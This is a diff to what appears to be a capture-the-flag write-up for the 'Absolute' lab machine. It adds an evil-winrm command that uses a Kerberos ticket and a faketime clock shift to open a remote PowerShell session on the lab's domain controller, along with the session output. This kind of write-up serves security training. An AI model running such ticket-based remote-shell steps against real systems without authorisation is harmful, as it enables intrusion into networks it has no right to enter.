@@ -628,6 +628,21 @@ export KRB5CCNAME=winrm_user.ccache
 Then i should be able to access WINRM
 
 ```python
-
+faketime -f +7h evil-winrm -i dc.absolute.htb -u winrm_user -r absolute.htb
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_user\Documents>
 ```
+
+I now have access!
+
+
 
